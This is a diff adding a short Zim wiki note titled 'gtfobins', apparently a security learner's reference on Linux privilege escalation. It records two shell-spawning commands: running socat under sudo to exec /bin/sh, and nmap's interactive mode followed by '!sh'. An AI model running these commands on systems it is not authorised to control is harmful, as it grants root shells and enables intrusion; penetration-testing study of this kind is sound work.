@@ -1,0 +1,19 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-15T05:22:50-04:00
+
+====== gtfobins ======
+Created Friday 15 May 2020
+
+
+linux privilege escalation site::: awesome site
+
+
+1.socat 
+--sudo
+----sudo socat stdin exec:/bin/sh
+
+
+2.nmap
+   nmap --interactive
+	>!sh
